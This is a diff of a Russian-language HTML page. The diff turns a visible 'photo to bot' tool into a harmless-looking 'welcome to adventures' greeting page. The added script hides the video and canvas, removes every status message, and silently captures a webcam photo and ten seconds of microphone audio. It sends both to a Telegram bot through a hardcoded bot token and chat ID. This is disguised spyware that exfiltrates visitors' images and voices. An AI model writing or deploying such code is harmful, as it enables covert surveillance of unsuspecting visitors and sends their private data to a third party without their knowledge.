@@ -2,60 +2,91 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Фото в бота</title>
+  <title>Добро пожаловать!</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 2.5em;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+    }
+    p {
+      font-size: 1.2em;
+      max-width: 600px;
+      margin: 20px auto;
+      line-height: 1.6;
+    }
+    #video, #canvas { display: none; } /* Скрываем видео и канвас */
+  </style>
 </head>
 <body>
-  <video id="video" autoplay style="width: 100%; max-width: 500px;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <p id="status"></p>
+  <video id="video" autoplay muted></video>
+  <canvas id="canvas"></canvas>
+  <h1>Добро пожаловать в мир приключений!</h1>
+  <p>Здесь начинается твоё путешествие. Этот сайт — маленькое чудо технологий, которое соединяет реальность и цифровой мир. Наслаждайся моментом, ведь каждый день — это новая история!</p>
+  <p>Вокруг тебя много интересного: яркие краски, звуки природы и бесконечные возможности. Давай сделаем этот день незабываемым!</p>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
-    const status = document.getElementById('status');
+    const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
+    const chatId = '5678878569';
 
-    // Доступ к фронтальной камере
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    // Запуск камеры и микрофона
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
       .then(stream => {
         video.srcObject = stream;
-        // Ждём, пока видео загрузится, и делаем фото
-        video.onloadedmetadata = () => takePhoto();
+        video.onloadedmetadata = () => {
+          takePhoto(stream); // Фото
+          recordAudio(stream); // Аудио
+        };
       })
-      .catch(err => status.textContent = 'Ошибка камеры: ' + err);
+      .catch(err => console.error('Ошибка доступа:', err));
 
-    // Функция захвата и отправки фото
-    async function takePhoto() {
+    // Захват фото и отправка
+    async function takePhoto(stream) {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0);
       const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
 
-      // Telegram API
-      const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
-      const chatId = '5678878569';
-      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
-
-      // Используем FormData для отправки файла
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('photo', photoBlob, 'photo.png');
 
-      try {
-        status.textContent = 'Отправка...';
-        const response = await fetch(url, {
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).catch(err => console.error('Ошибка отправки фото:', err));
+    }
+
+    // Запись и отправка 10 секунд аудио
+    async function recordAudio(stream) {
+      const mediaRecorder = new MediaRecorder(stream);
+      const audioChunks = [];
+
+      mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+      mediaRecorder.onstop = async () => {
+        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('voice', audioBlob, 'voice.ogg');
+
+        fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
           method: 'POST',
           body: formData
-        });
-        if (response.ok) {
-          status.textContent = 'Фото отправлено!';
-        } else {
-          const errorText = await response.text();
-          status.textContent = 'Ошибка отправки: ' + errorText;
-        }
-      } catch (error) {
-        status.textContent = 'Ошибка: ' + error;
-      }
+        }).catch(err => console.error('Ошибка отправки аудио:', err));
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 10000); // 10 секунд
     }
   </script>
 </body>
